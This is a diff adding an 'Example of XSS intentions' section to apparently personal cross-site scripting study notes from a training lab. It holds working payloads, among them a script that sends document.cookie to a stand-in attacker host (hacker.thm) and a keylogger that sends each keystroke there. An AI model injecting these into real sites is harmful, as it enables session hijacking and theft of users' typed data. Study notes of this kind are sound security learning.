@@ -35,3 +35,29 @@ Simple xss payload. Pop up message with 'XSS' string.
 ### Where Payloads Are Injected
 
 Typically injected into areas of user input and display's it.
+
+### Example of XSS intentions
+
+#### Proof of Concept:
+
+`<script>alert('XSS')</script>`
+
+#### Session Stealing:
+
+Sends target's cookies to the server controlled by an attacker
+
+`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
+
+btoa() -> encodes cookie.
+
+#### Key Logger:
+
+Capturing sensitive data
+
+<script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}</script>
+
+#### Business Logic Attack:
+
+Payloads that capturing and abusing some function withing the web app.
+
+For example if there is a function for changing the email address the attacker could change the target's address to his own.
